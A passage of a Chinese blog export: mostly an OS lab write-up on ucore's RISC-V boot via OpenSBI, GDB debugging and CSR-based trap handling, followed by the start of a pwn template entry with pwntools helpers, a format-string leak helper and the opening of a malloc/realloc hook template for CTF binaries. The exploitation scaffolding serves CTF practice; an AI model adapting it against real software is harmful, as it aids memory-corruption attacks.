<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_start:</span><br><span class="line">	/* Find preferred boot HART id */</span><br><span class="line">	MOV_3R	s0, a0, s1, a1, s2, a2</span><br><span class="line">	call	fw_boot_hart</span><br><span class="line">	add	a6, a0, zero</span><br><span class="line">	MOV_3R	a0, s0, a1, s1, a2, s2</span><br><span class="line">	li	a7, -1</span><br><span class="line">	beq	a6, a7, _try_lottery</span><br><span class="line">	/* Jump to relocation wait loop if we are not boot hart */</span><br><span class="line">	bne	a0, a6, _wait_relocate_copy_done</span><br><span class="line">_try_lottery:</span><br><span class="line">	/* Jump to relocation wait loop if we don&#x27;t get relocation lottery */</span><br><span class="line">	lla	a6, _relocate_lottery</span><br><span class="line">	li	a7, 1</span><br><span class="line">	amoadd.w a6, a7, (a6)</span><br><span class="line">	bnez	a6, _wait_relocate_copy_done</span><br><span class="line"></span><br><span class="line">	/* Save load address */</span><br><span class="line">	lla	t0, _load_start</span><br><span class="line">	lla	t1, _fw_start</span><br><span class="line">	REG_S	t1, 0(t0)</span><br></pre></td></tr></table></figure>



<h2 id="调试-研究os装载例程"><a href="#调试-研究os装载例程" class="headerlink" title="调试(研究os装载例程)"></a>调试(研究os装载例程)</h2><blockquote>
<p>有了上述基础那么就可以开始调试环节了，利用make qemu来编译源代码，make gdb来调试，将makefile中的make qemu更改一下不然会有问题（至少我的有….）</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">......................</span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: qemu </span></span><br><span class="line"><span class="section">qemu: <span class="variable">$(UCOREIMG)</span> <span class="variable">$(SWAPIMG)</span> <span class="variable">$(SFSIMG)</span></span></span><br><span class="line"><span class="comment">#	$(V)$(QEMU) -kernel $(UCOREIMG) -nographic</span></span><br><span class="line">	<span class="variable">$(V)</span><span class="variable">$(QEMU)</span> \</span><br><span class="line">		-machine virt \</span><br><span class="line">		-nographic \</span><br><span class="line">		-bios default \</span><br><span class="line">		-S 	\                              <span class="comment">##启动时暂停便于调试</span></span><br><span class="line">		-gdb tcp::12345 \                <span class="comment">## gdb监听端口</span></span><br><span class="line">		-kernel <span class="variable">$(UCOREIMG)</span>                <span class="comment">## 新增</span></span><br><span class="line"><span class="comment">##		-device loader,file=$(UCOREIMG),addr=0x80200000          ## 注释掉此部分</span></span><br><span class="line">.............................</span><br></pre></td></tr></table></figure>

<p>qemu的路径和gdb的一些路径改一下，改成你安装的bin文件中的可执行程序的文件名。gdb我没有安装riscv版本的，直接用的gdb-multiach，可供参考。</p>
<blockquote>
<p>可观察到复位地址以及阻塞地址，和上面讲的都是一样的</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/os/%E9%98%BB%E5%A1%9E.png" alt="image-20240831175014062"></p>
<p><img src="/../../../themes/butterfly/source/img/mypic/os/reset.png" alt="image-20240831175046980"></p>
<h3 id="opensbi"><a href="#opensbi" class="headerlink" title="opensbi"></a>opensbi</h3><blockquote>
<p>将断点打到0x80000000，然后continue，观察一下opensbi的指令看看是否和先前分析的一样。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/os/opensbi.png" alt="image-20240831175528255"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_start:</span><br><span class="line">	/* Find preferred boot HART id */</span><br><span class="line">	MOV_3R	s0, a0, s1, a1, s2, a2</span><br><span class="line">	call	fw_boot_hart</span><br><span class="line">	add	a6, a0, zero</span><br><span class="line">	MOV_3R	a0, s0, a1, s1, a2, s2</span><br><span class="line">	li	a7, -1</span><br><span class="line">	beq	a6, a7, _try_lottery</span><br><span class="line">	/* Jump to relocation wait loop if we are not boot hart */</span><br><span class="line">	bne	a0, a6, _wait_relocate_copy_done</span><br></pre></td></tr></table></figure>

<p>tql，确实是一样的，之前分析的没有一点问题。具体函数功能就不做分析了，整个opensbi估计够我学好长时间了，以后有机会的话再学习吧。</p>
<h3 id="os加载"><a href="#os加载" class="headerlink" title="os加载"></a>os加载</h3><blockquote>
<p>opensbi就是实现see为os提供sbi的接口，因此opensbi是运作在m态之上的。接下来解释os的加载了，os的入口点也是在链接控制脚本中指定，这是本实验的连接控制脚本所指定的入口点，至于段合并之类的就不展示了，本质就是手动控制一些program segment的合并，精确控制每一个segment的基址，毕竟os之前没有加载器之类的东西，默认链接脚本生成的可执行文件现在的机器是不认识的。接下来就是找入口点地址，利用p指令可以打印出来，这里面还有一个坑，就是此内核的默认make是去掉符号表的，因此手动改一下吧：手动搜索strip，把这个删掉就可以了，gdb也要执行file bin&#x2F;kernel才行，不知道为什么。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Simple linker script for the ucore kernel.</span><br><span class="line">   See the GNU ld &#x27;info&#x27; manual (&quot;info ld&quot;) to learn the syntax. */</span><br><span class="line"></span><br><span class="line">OUTPUT_ARCH(riscv)</span><br><span class="line">ENTRY(kern_entry)</span><br><span class="line">...............</span><br></pre></td></tr></table></figure>

<p><img src="/../../../themes/butterfly/source/img/mypic/os/%E5%85%A5%E5%8F%A3%E7%82%B9.png" alt="image-20240831181055849"></p>
<p>可以看见入口点就做两件事，调整sp到bootstacktop并加载正真的kernel的初始函数。</p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240831181457737.png" alt="image-20240831181457737"></p>
<h3 id="os运行"><a href="#os运行" class="headerlink" title="os运行"></a>os运行</h3><blockquote>
<p>继续打断点，然后运行，这就是我们实验上写的内核的初始函数喽，调用sbi接口进行打印，然后坠入死循环（最后一条指令），因此qemu就直接变砖了哈哈哈，只能强制关闭shell才行，终端都相应不了了，这也许就是下一次实验实现中断的原因吧。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/os/runstart.png" alt="image-20240831182044836"></p>
<blockquote>
<p>可以观察一下qemu的执行结果，会打印出咱们想要的</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240831182427141.png" alt="image-20240831182427141"></p>
<blockquote>
<p>可以看出程序已经跟死了没啥差别了。。。。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/os/die.png" alt="image-20240831182501902"></p>
<h2 id="中断功能加入"><a href="#中断功能加入" class="headerlink" title="中断功能加入"></a>中断功能加入</h2><blockquote>
<p>在做此实验之前需要一些前置知识</p>
</blockquote>
<h3 id="特权指令"><a href="#特权指令" class="headerlink" title="特权指令"></a>特权指令</h3><p>SYSTEM操作码在RISC-V指令集中承担着编码所有特权指令的角色。特权指令是那些只能由具有特权的处理器模式（例如内核模式）执行的指令。这些指令分为两大类：</p>
<ol>
<li><strong>原子性读-修改-写CSRs的指令</strong>：这些指令是对控制和状态寄存器（CSRs）进行操作的指令。CSRs是RISC-V处理器中的特殊寄存器，用于存储与处理器的控制和状态相关的信息，例如中断处理、异常状态、性能计数器等。原子性意味着这些指令可以确保在进行读取、修改和写入操作时，不会被其他指令打断，从而保证操作的完整性。</li>
<li><strong>其他特权指令</strong>：除了操作CSRs的指令，其他特权指令还包括许多与处理器的特权模式相关的操作，例如切换处理器模式、管理虚拟内存、处理异常和中断等。这些指令通常和处理器的管理功能紧密相关。</li>
</ol>
<h3 id="CSRs"><a href="#CSRs" class="headerlink" title="CSRs"></a>CSRs</h3><p>RISC-V为CSR预留了一个12位的地址空间，即每个CSR的地址由12位组成。这12位地址中的高4位（csr[11:8]）用于定义CSR的访问权限：</p>
<ol>
<li>**csr[11:10]**：这两位用于指示该CSR是可读写还是只读。不同的组合表示不同的读写权限：<ul>
<li><code>00</code>、<code>01</code>、<code>10</code> 表示该CSR是可读写的。</li>
<li><code>11</code> 表示该CSR是只读的。</li>
</ul>
</li>
<li>**csr[9:8]**：这两位用于定义最低能够访问该CSR的特权级别。RISC-V有多个特权级别，如用户模式、监督模式和机器模式，csr[9:8]的值决定了哪一个特权级别的代码可以访问这个寄存器。</li>
</ol>
<p><img src="/../../../themes/butterfly/source/img/mypic/os/csrs.png" alt="image-20240831214926417"></p>
<h3 id="CSR字段规范（filed-specification）"><a href="#CSR字段规范（filed-specification）" class="headerlink" title="CSR字段规范（filed specification）"></a>CSR字段规范（filed specification）</h3><p><strong>WIRI（保留写入忽略，读取忽略值）</strong>：</p>
<ul>
<li>这些字段是保留供将来使用的。写入这些字段时，硬件会忽略写入的值，读取时返回的值无意义。此标签主要用于那些在当前没有明确用途的CSR字段，以避免未来使用中的冲突。</li>
</ul>
<p><strong>WPRI（保留写入保留值，读取忽略值）</strong>：</p>
<ul>
<li>当你写入一个寄存器时，如果该寄存器包含WPRI字段，硬件会保留这些字段的现有值，而忽略你试图写入的新值。这确保了当将来这些字段有实际用途时，它们的值不会因先前的操作而被破坏。</li>
</ul>
<p><strong>WRL（写入&#x2F;读取仅合法值）</strong>：</p>
<ul>
<li>对这些字段的写入和读取仅支持特定的合法值。如果你写入一个不合法的值，硬件可能不会引发异常，但读取的结果可能是未定义的。通常，硬件会返回最后一个合法值，或根据某些硬件状态位返回其他值。</li>
</ul>
<p><strong>WARL（写入任意值，读取合法值）</strong>：</p>
<ul>
<li>这些字段允许你写入任何值，但硬件会自动确保读取时返回合法的值。这个机制使得即使软件写入了非标准值，硬件也能保证系统的稳定性和一致性。</li>
</ul>
<h3 id="Supervisor-Level-ISA"><a href="#Supervisor-Level-ISA" class="headerlink" title="Supervisor-Level ISA"></a>Supervisor-Level ISA</h3><blockquote>
<p>因为是操作系统实验，故跳过了m态的部分，其依赖于硬件提供的sbi接口</p>
</blockquote>
<h4 id="Supervisor-Status-Register-sstatus"><a href="#Supervisor-Status-Register-sstatus" class="headerlink" title="Supervisor Status Register (sstatus)"></a>Supervisor Status Register (sstatus)</h4><p><img src="/../../../themes/diaspora/source/img/mypic/com/sstatus.png" alt="image-20240831215741967"><strong>SPP（Supervisor Previous Privilege）</strong>:</p>
<ul>
<li><p><strong>位置</strong>: 在 RV32 中位于第 8 位，在 RV64 和 RV128 中位于第 20 位。</p>
</li>
<li><p>功能</p>
<p>: 该位用于指示陷入监督模式之前处理器的特权级别。</p>
<ul>
<li>如果陷入（trap）之前处理器是在用户模式（User Mode）下运行，则该位为0。</li>
<li>如果是在监督模式（Supervisor Mode）下运行，则该位为1。</li>
</ul>
</li>
<li><p><strong>使用场景</strong>: 当使用 <code>SRET</code> 指令从陷阱（trap）返回时，处理器会根据该位决定返回到用户模式或监督模式。</p>
</li>
</ul>
<p><strong>SIE（Supervisor Interrupt Enable）</strong>:</p>
<ul>
<li><p><strong>位置</strong>: 在 RV32 中位于第 1 位，在 RV64 和 RV128 中位于第 1 位。</p>
</li>
<li><p>功能</p>
<p>: 该位控制监督模式下的全局中断使能。</p>
<ul>
<li>当 SIE 为 1 时，监督模式中断被使能。</li>
<li>当 SIE 为 0 时，所有监督模式下的中断被禁用。</li>
</ul>
</li>
<li><p><strong>使用场景</strong>: 在处理器需要临时屏蔽中断时，OS 可以清除 SIE 位，以确保中断不会打断关键的代码执行。</p>
</li>
</ul>
<p><strong>SPIE（Supervisor Previous Interrupt Enable）</strong>:</p>
<ul>
<li><p><strong>位置</strong>: 在 RV32 中位于第 5 位，在 RV64 和 RV128 中位于第 5 位。</p>
</li>
<li><p>功能</p>
<p>: 该位保存了陷入监督模式前 SIE 位的值。</p>
<ul>
<li>当陷阱发生时，SIE 位的值会被保存到 SPIE 中，并且 SIE 位被清除（禁用中断）。</li>
<li>当执行 <code>SRET</code> 指令返回时，SIE 位将被恢复为 SPIE 的值。</li>
</ul>
</li>
<li><p><strong>使用场景</strong>: 这确保了中断状态在陷入和返回过程中的一致性。</p>
</li>
</ul>
<p><strong>UPIE（User Previous Interrupt Enable）</strong>:</p>
<ul>
<li><p><strong>位置</strong>: 在 RV32 中位于第 4 位，在 RV64 和 RV128 中位于第 4 位。</p>
</li>
<li><p>功能</p>
<p>: 该位保存了陷入用户模式前的用户模式中断使能状态。</p>
<ul>
<li>类似于 SPIE，当处理器从用户模式陷入监督模式时，UPIE 保存用户模式的中断使能状态。</li>
<li>当 <code>URET</code> 指令被执行时，UIE 位会被恢复为 UPIE 的值。</li>
</ul>
</li>
<li><p><strong>使用场景</strong>: 用于管理用户模式的中断状态，确保当用户模式任务恢复执行时，其中断状态与陷入前一致。</p>
</li>
</ul>
<p><strong>UIE（User Interrupt Enable）</strong>:</p>
<ul>
<li><p><strong>位置</strong>: 在 RV32 中位于第 0 位，在 RV64 和 RV128 中位于第 0 位。</p>
</li>
<li><p>功能</p>
<p>: 该位控制用户模式下的全局中断使能。</p>
<ul>
<li>当 UIE 为 1 时，用户模式中断被使能。</li>
<li>当 UIE 为 0 时，用户模式中断被禁用。</li>
</ul>
</li>
<li><p><strong>使用场景</strong>: 在用户模式任务需要屏蔽中断时，OS 可以操作 UIE 位。</p>
</li>
</ul>
<h4 id="Supervisor-Trap-Vector-Base-Address-Register-stvec"><a href="#Supervisor-Trap-Vector-Base-Address-Register-stvec" class="headerlink" title="Supervisor Trap Vector Base Address Register (stvec)"></a>Supervisor Trap Vector Base Address Register (stvec)</h4><p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240831221145005.png" alt="image-20240831221145005"></p>
<blockquote>
<p>关于mode</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240831221210957.png" alt="image-20240831221210957"></p>
<h4 id="Supervisor-Interrupt-Registers-sip-and-sie"><a href="#Supervisor-Interrupt-Registers-sip-and-sie" class="headerlink" title="Supervisor Interrupt Registers (sip and sie)"></a>Supervisor Interrupt Registers (sip and sie)</h4><blockquote>
<p>分别代表着中断挂起（pending）和中断使能（enable）是对每种类型中断的精确控制，主要分为这三种：software interrupts, timer interrupts, and external interrupts，软件中断又分为u型和s型</p>
</blockquote>
<h4 id="Supervisor-Timers-and-Performance-Counters"><a href="#Supervisor-Timers-and-Performance-Counters" class="headerlink" title="Supervisor Timers and Performance Counters"></a>Supervisor Timers and Performance Counters</h4><blockquote>
<p><code>scounteren</code> 是一个用于控制用户模式（U-mode）下硬件性能监控计数器（Hardware Performance Monitoring Counters）可用性的寄存器。通过设置或清除 <code>scounteren</code> 寄存器中的各个位，监督模式（S-mode）可以控制用户模式下对特定计数器的访问权限。</p>
</blockquote>
<h4 id="Supervisor-Scratch-Register-sscratch"><a href="#Supervisor-Scratch-Register-sscratch" class="headerlink" title="Supervisor Scratch Register (sscratch)"></a>Supervisor Scratch Register (sscratch)</h4><p><code>sscratch</code> 寄存器是一个 XLEN 位的读&#x2F;写寄存器，专门供监督模式（Supervisor Mode）使用。这个寄存器通常用来保存当前硬件线程（hart）在执行用户代码时监督模式的上下文指针。</p>
<h4 id="典型用途"><a href="#典型用途" class="headerlink" title="典型用途"></a>典型用途</h4><ul>
<li><strong>存储指针</strong>：<code>sscratch</code> 寄存器通常用于存储一个指向 hart 本地监督模式上下文的指针。当处理器在用户模式下运行时，<code>sscratch</code> 中会保存与监督模式相关的关键信息，比如栈指针或数据结构的地址。</li>
<li><strong>陷阱处理程序初始化</strong>：在发生陷阱（trap）时，处理器会切换到监督模式，<code>sscratch</code> 寄存器的内容可以与某个用户寄存器的内容交换。这种交换机制允许陷阱处理程序快速获得一个可用的工作寄存器，以便开始处理陷阱。例如，陷阱处理程序可以将 <code>sscratch</code> 的值加载到一个通用寄存器中，以便使用监督模式的栈指针。</li>
</ul>
<h4 id="Supervisor-Exception-Program-Counter-sepc"><a href="#Supervisor-Exception-Program-Counter-sepc" class="headerlink" title="Supervisor Exception Program Counter (sepc)"></a>Supervisor Exception Program Counter (sepc)</h4><p><code>sepc</code> 是一个 XLEN 位的读&#x2F;写寄存器，用于存储发生异常时的程序计数器（PC）值。这个寄存器在监督模式（S-mode）下使用，通常用于记录导致异常的指令地址，以便在处理完异常后能够恢复程序执行。</p>
<h4 id="寄存器结构"><a href="#寄存器结构" class="headerlink" title="寄存器结构"></a>寄存器结构</h4><ul>
<li><strong>最低位 <code>sepc[0]</code></strong>: 永远为零。这是因为在RISC-V中，指令的对齐要求至少为16位或32位，因此程序计数器的最低一位不可能为1。</li>
<li><strong>最低两位 <code>sepc[1:0]</code></strong>: 对于不支持16位指令对齐的实现，这两位始终为零。这确保了程序计数器指向的是一个有效的指令地址。</li>
</ul>
<h4 id="Supervisor-Cause-Register-scause"><a href="#Supervisor-Cause-Register-scause" class="headerlink" title="Supervisor Cause Register (scause)"></a>Supervisor Cause Register (scause)</h4><blockquote>
<p> 指示引发中断的原因</p>
</blockquote>
<h4 id="Supervisor-Trap-Value-stval-Register"><a href="#Supervisor-Trap-Value-stval-Register" class="headerlink" title="Supervisor Trap Value (stval) Register"></a>Supervisor Trap Value (stval) Register</h4><blockquote>
<p><strong>stval 寄存器</strong> 是一个 XLEN 位的可读写寄存器（XLEN 是架构的字长，如 32 位或 64 位）。当系统进入 S 模式（Supervisor mode）并处理陷阱（异常）时，<code>stval</code> 会被写入与该异常相关的特定信息，以便帮助软件处理该异常。</p>
</blockquote>
<h4 id="Supervisor-Address-Translation-and-Protection-satp-Register"><a href="#Supervisor-Address-Translation-and-Protection-satp-Register" class="headerlink" title="Supervisor Address Translation and Protection (satp) Register"></a>Supervisor Address Translation and Protection (satp) Register</h4><blockquote>
<p>和地址转换相关</p>
</blockquote>
<h2 id="lab相关"><a href="#lab相关" class="headerlink" title="lab相关"></a>lab相关</h2><blockquote>
<p>知道了部分基础就可以进行试验了，实验基本上处理的是操作系统层级的异常和中断。</p>
</blockquote>
<h3 id="1-1初始化"><a href="#1-1初始化" class="headerlink" title="1.1初始化"></a>1.1初始化</h3><blockquote>
<p>这一部分是初始化那些个异常寄存器，让中断以及异常发生时能挑战到相应的入口点。接下来学习此部分代码</p>
<p>代码如下：这里有一个问题，那就是在EBREAK之前并没有设置SIE，为什么还是能触发中断。（得到的答案是SIE只能禁止中断，而不能进制异步中断（异常））。</p>
<p>idt_init(); 用来初始化vector table，也就是设置中断处理的entry，主要改变的是stvec这个寄存器，通过定义在riscv.h中的一个宏来实现。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> write_csr(reg, val) (&#123; \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (__builtin_constant_p(val) &amp;&amp; (unsigned long)(val) &lt; 32) \</span></span><br><span class="line"><span class="meta">    asm volatile (<span class="string">&quot;csrw &quot;</span> #reg <span class="string">&quot;, %0&quot;</span> :: <span class="string">&quot;i&quot;</span>(val)); \</span></span><br><span class="line"><span class="meta">  <span class="keyword">else</span> \</span></span><br><span class="line"><span class="meta">    asm volatile (<span class="string">&quot;csrw &quot;</span> #reg <span class="string">&quot;, %0&quot;</span> :: <span class="string">&quot;r&quot;</span>(val)); &#125;)</span></span><br></pre></td></tr></table></figure>

<p>本实验中需要时钟中断的触发，这需要了解sie这个寄存器，这个寄存器为os开发提供了细粒度的异常控制，具体可以控制需要触发哪个异常。代码：<code>set_csr(sie, MIP_STIP);</code>具体参照：</p>
<p>A supervisor-level timer interrupt is pending if the STIP bit in the sip register is set. Supervisorlevel timer interrupts are disabled when the STIE bit in the sie register is clear. An SBI call to the SEE may be used to clear the pending timer interrupt.</p>
<p>其中interrupt被分为三类，一类为soft，一类为time，一类为extern，为别对应三种细粒度的控制</p>
<p>最后的初始化是异常使能位的初始化，主要涉及到sstatus这个寄存器，这个寄存器控制所有中断是否能触发，若此位为0那么细粒度的控制无效。</p>
<p>总结来说中断的触发需要三个条件，先挂起再使能，也要保证全局的可触发性：</p>
<p>**<code>sip</code>**：相应位为1。</p>
<p>**<code>sie</code>**：相应位为1。</p>
<p><strong><code>sstatus</code> 中的 SIE</strong>：相应位为1；</p>
<p>或者异步中断（异常）（Interrupt为0）可以无条件触发。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/wRpoXdLnQzwCvsSgtn1GKtUIlIG44=.png" alt="已上传的图片"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">kern_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    ..................</span><br><span class="line">    idt_init();  <span class="comment">// init interrupt descriptor table</span></span><br><span class="line">    <span class="comment">//void (*invalid_function)() = (void (*)())0x80200003;</span></span><br><span class="line">    <span class="comment">//invalid_function();</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;EBREAK\n&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="comment">// rdtime in mbare mode crashes</span></span><br><span class="line">    clock_init();  <span class="comment">// init clock interrupt</span></span><br><span class="line"></span><br><span class="line">    intr_enable();  <span class="comment">// enable irq interrupt</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-中断逻辑的实现之状态保存与恢复"><a href="#1-2-中断逻辑的实现之状态保存与恢复" class="headerlink" title="1.2 中断逻辑的实现之状态保存与恢复"></a>1.2 中断逻辑的实现之状态保存与恢复</h3><blockquote>
<p>在第一步的时候已经将地址绑定到了alltraps，<code>write_csr(stvec, &amp;__alltraps);</code>，因此异常处理的实际入口在此，此函数使用汇编实现，定义在trapentry.S中，主要逻辑如下：</p>
<p>保存通用寄存器的状态和一些csr寄存器的状态以便于异常处理原因查找和执行流的恢复。大多数csr不用手动改变，涉及到特权模式的切换csr也会自动修改，基本上就是记录一下异常发生的位置以及异常发生的原因，最主要的还是状态的保存与切换，这就得了解sscratch的功能了，具体代码如下：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 1.3 中断逻辑的实现之选择性处理</span><br><span class="line"></span><br><span class="line">&gt; 具体什么中断该用什么代码来处理，此程序设计十分巧妙，具体的逻辑在trap函数中，实现并不复杂，但是巧妙在你如何传递异常信息。传递信息的逻辑为将中断信息保存在栈中，并将栈指针传递给trap函数作为第一个参数。那我以后总不能以栈指针交互吧，这太麻烦了，所以就用c语言定义了结构体,这也是一种汇编和c交互的方法吧，如下：</span><br><span class="line">&gt;</span><br><span class="line">&gt; ```c</span><br><span class="line">&gt; struct trapframe &#123;</span><br><span class="line">&gt;     struct pushregs gpr;</span><br><span class="line">&gt;     uintptr_t status;</span><br><span class="line">&gt;     uintptr_t epc;</span><br><span class="line">&gt;     uintptr_t badvaddr;</span><br><span class="line">&gt;     uintptr_t cause;</span><br><span class="line">&gt; &#125;;</span><br><span class="line">&gt; __alltraps:</span><br><span class="line">&gt;     SAVE_ALL</span><br><span class="line">&gt; </span><br><span class="line">&gt;     move  a0, sp</span><br><span class="line">&gt;     jal trap</span><br><span class="line">&gt;     # sp should be the same as before &quot;jal trap&quot;</span><br><span class="line">&gt; </span><br><span class="line">&gt;     .globl __trapret</span><br><span class="line">&gt; __trapret:</span><br><span class="line">&gt;     RESTORE_ALL</span><br><span class="line">&gt;     # return from supervisor call</span><br><span class="line">&gt;     sret</span><br></pre></td></tr></table></figure>
<blockquote>
<p>那么就可以完美传递中断信息，具体中断处理代码的实现就是简单的了</p>
</blockquote>
<h3 id="1-4-中断处理逻辑实现与检测"><a href="#1-4-中断处理逻辑实现与检测" class="headerlink" title="1.4 中断处理逻辑实现与检测"></a>1.4 中断处理逻辑实现与检测</h3>]]></content>
      <categories>
        <category>cs</category>
        <category>os</category>
        <category>ucore实验</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>riscv</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/04/pwn%E6%A8%A1%E6%9D%BF/all/</url>
    <content><![CDATA[<h2 id="ANY"><a href="#ANY" class="headerlink" title="ANY"></a>ANY</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./ttt&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">ARROW = <span class="string">&#x27; ============================================&gt; &#x27;</span> </span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rv      = <span class="keyword">lambda</span> num          	    :io.recv(num)</span><br><span class="line">rec      = <span class="keyword">lambda</span>           	        :io.recv()</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :io.recvuntil(delims)</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia	= <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">li      = <span class="keyword">lambda</span> tag, x             :<span class="built_in">print</span>(<span class="string">&quot;\x1b[1;38;5;214m&quot;</span> + tag + ARROW + <span class="string">&quot;\x1b[0m&quot;</span> + <span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll      = <span class="keyword">lambda</span> x                  :<span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a>fmtstr</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getadd</span>(<span class="params">fmt</span>):</span><br><span class="line">    sa(<span class="string">b&#x27;First, please tell me your name.\n&#x27;</span>,fmt)</span><br><span class="line">    byte_stream = io.recvuntil(<span class="string">b&quot;!&quot;</span>)</span><br><span class="line">    split_parts = byte_stream.split(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> split_parts</span><br></pre></td></tr></table></figure>

<h2 id="pr"><a href="#pr" class="headerlink" title="pr"></a>pr</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>(<span class="params">add1,add2,canary,stackadd</span>):</span><br><span class="line">    li(<span class="string">&quot;libcbase&quot;</span>,<span class="built_in">hex</span>(add1))</span><br><span class="line">    li(<span class="string">&quot;probase&quot;</span>,<span class="built_in">hex</span>(add2))</span><br><span class="line">    li(<span class="string">&quot;canary&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">    li(<span class="string">&quot;stack&quot;</span>,<span class="built_in">hex</span>(stackadd))</span><br></pre></td></tr></table></figure>

<h2 id="rellochook-mallochook"><a href="#rellochook-mallochook" class="headerlink" title="rellochook+mallochook"></a>rellochook+mallochook</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./xueba&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">ARROW = <span class="string">&#x27; ============================================&gt; &#x27;</span> </span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rv      = <span class="keyword">lambda</span> num          	    :io.recv(num)</span><br><span class="line">rec      = <span class="keyword">lambda</span>           	        :io.recv()</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :io.recvuntil(delims)</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia	= <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">li      = <span class="keyword">lambda</span> tag, x             :<span class="built_in">print</span>(<span class="string">&quot;\x1b[1;38;5;214m&quot;</span> + tag + ARROW + <span class="string">&quot;\x1b[0m&quot;</span> + <span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll      = <span class="keyword">lambda</span> x                  :<span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span 